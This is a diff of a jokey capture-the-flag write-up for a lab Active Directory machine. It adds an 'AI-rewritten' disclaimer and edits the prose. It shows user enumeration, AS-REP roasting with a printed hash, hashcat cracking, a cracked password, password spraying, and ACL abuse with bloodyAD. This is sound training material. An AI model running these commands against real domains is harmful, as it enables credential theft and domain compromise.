@@ -3,8 +3,12 @@
 # Synopsis
 Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn't have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application's API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator's hash and compromise the whole domain through the certificate exploitation.
 
+!!!warning DISCLAIMER
+This writeup has been rewritten by AI and contains traces of Gen Z humor. For the uninitiated: this is a shitpost with substance. Read at your own risk.
+!!!
+
 # Enumeration
-I ain’t wastin' time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into **user enumeration**. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin').
+I ain't wastin' time with your granddaddy’s nmap scan. Nah, we already know this box be bustin' that Active Directory life, so we skip the foreplay and go raw into **user enumeration**. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin').
 
 ```
 David Anderson
@@ -16,10 +20,10 @@ Lauren Clark
 Ethan Rodriguez
 ```
 
-Now we feed these names into `UsernameAnarchy` — a beautiful little gremlin of a tool that chews on names and vomits out 6,000 permutations of corporate identity theft.
+Now we feed these names into `UsernameAnarchy`, a beautiful little gremlin of a tool that chews on names and vomits out 6000 permutations of corporate identity theft.
 
 ```console
-$ /username-anarchy/username-anarchy --input-file users.txt > probably_usernames.txt
+$ username-anarchy --input-file users.txt > probably_usernames.txt
 ```
 
 And just like that, we got a whole buffet of usernames. Next up: **Kerbrute**, because what’s more fun than whispering sweet nothings to Kerberos and seeing who moans back?
@@ -59,7 +63,7 @@ e.rodriguez@INFILTRATOR.HTB
 l.clark@INFILTRATOR.HTB
 ```
 
-Time to get greasy with **ASREPRoasting**. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yessir!
+Time to get greasy with **ASREPRoasting**. We send a lil’ love letter to the domain like *"hey, gimme them sweet sweet hashies"*, and boom, one account responds like *"sure babe, no pre-auth needed!"*. Yessir!
 
 ```console
 $ GetNPUsers.py INFILTRATOR.HTB/ -dc-ip 10.10.11.31 -no-pass -usersfile all_ad_users -format hashcat
@@ -75,13 +79,13 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 $krb5asrep$23$l.clark@INFILTRATOR.HTB@INFILTRATOR.HTB:96becffa85728f8fea33be18e9ca6164$bb2614f154c83cbcd98e1f110566be9d1ea1bd44eb7041f119b22b73bbb82175e9e7b309f518c4dab0469efcb47e15a332caf0e00f82a55ad45afed64a8b923afc1f832664f1f6eba19414e6b706933d3c27a656688f59e748ba7ca64e68647bbf113d67afe8d39d39db2ae9f8bb28383bc42f48a22969d34a21599c40d1bd240a92185222100a9787ddaaa78660197a21affdccb023e9114b51797693a6a37cfc72ac9dc300b08f9bc89a9d64c522c00a3262d67b54f34d24efdb74ad9bceae2cbaa2631c4d595162f46a7c0dcbc8607e77c71986e2a435def66cfd5a3de16aee5074dfdba977dd8d037083c189d523862e
 ```
 
-Turns out our girl **l.clark** out here just raw-dogging Kerberos with no protection. Naturally, we hit her with the ol’ **hashcat special**:
+Turns out our girl **l.clark** out here just raw-dogging Kerberos with no protection. Naturally, we hit her with the ol' **hashcat special**:
 
 ```console
 $ hashcat -m 18200 lclark.hash $ROCKYOU
 ```
 
-This hash be cracking faster than a microwave burrito — and what do we get? That’s right, keys to the kingdom. VIP access. L.clark got us in the door, and now we’re poking around like we own the place.
+This hash be cracking faster than a microwave burrito. And what do we get? That’s right, keys to the kingdom. VIP access. L.clark got us in the door, and now we’re poking around like we own the place.
 
 ```console
 $ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users
@@ -89,7 +93,7 @@ SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 B
 SMB         10.10.11.31   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
 ```
 
-With these creds on our hands, we blast `nxc smb` again and go full snoop-mode on the domain — enumerate all the users like it’s roll call at hacker high school. We also run a cheeky lil' SID lookup:
+With these creds on our hands, we blast `nxc smb` again and go full snoop-mode on the domain. Enumerate all the users like it's roll call at hacker high school. We also run a cheeky lil' SID lookup:
 
 ```console
 $ lookupsid.py l.clark@INFILTRATOR.HTB | grep SidTypeUser
@@ -109,7 +113,7 @@ Password: WAT?watismypass!
 3102: INFILTRATOR\infiltrator_svc$ (SidTypeUser)
 ```
 
-We flex for a **Kerberoasting** round just in case someone slipped, but nah, nothing juicy. No tickets, no service accounts, just disappointment. But hold up — plot twist. Our recon pulls up a lil’ easter egg: **user k.turner** has a password just chillin’ in their description field. Man’s out here treating Active Directory like a Post-it note.
+We flex for a **Kerberoasting** round just in case someone slipped, but nah, nothing juicy. No tickets, no service accounts, just disappointment. But hold up, plot twist. Our recon pulls up a lil' easter egg: **user k.turner** has a password just chillin’ in their description field. Man’s out here treating Active Directory like a Post-it note.
 
 ```console
 $ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users | grep K.turner
@@ -118,7 +122,7 @@ SMB                      10.10.11.31   445    DC01             K.turner         
 
 So we take this blessed gift from k.turner’s description field and we **yeet** it into a password spray like we’re Oprah handing out creds:
 
-> _“You get a login! YOU get a login! ERRBODY LOGGING IN!”_
+> "You get a login! YOU get a login! ERRBODY LOGGING IN!"
 
 ```console
 $ nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
@@ -129,11 +133,11 @@ SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\d.anderson
 
 But then... Curveball. We see that both `m.harris` and `d.anderson` get the message `STATUS_ACCOUNT_RESTRICTION`. Excuse me??? Microsoft really out here like:
 
-> “Woah woah woah, hold up... you _do_ have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.” 
+> "Woah woah woah, hold up... you *do* have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever."
 
-This ain't a wrong password, nah. This is **“you got it, but you still ain't allowed.”** That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, _“not today, boi.”_
+This ain't necessarily a wrong password, nah. This is **“you might got it, but you still ain't allowed.”** That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, *"not today, boi."*
 
-So yeah — creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some ✨emotional boundary✨ arc and we gotta pivot.
+So yeah, creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some ✨emotional boundary✨ arc and we gotta pivot.
 
 ## Bloodhound
 So now that we got creds for `l.clark` (shoutout to my boy k.turner), we unleash **BloodHound** to sniff out the domain like a digital truffle pig.
@@ -166,7 +170,7 @@ But hold up... BloodHound whispers in our ear again: **“psst... `d.anderson` g
 
 Okay now we’re cooking. You know what that means? We can start **yeeting ACLs** around ike we’re modding the Minecraft server at 3AM.
 
-> “You get admin perms, you get admin perms—oh look, the economy’s ruined!”
+> “You get admin perms, you get admin perms. Oh look, the economy’s ruined!”
 
 So we bless our old pal `l.clark` with **GenericAll** over the entire OU using `bloodyAD`:
 
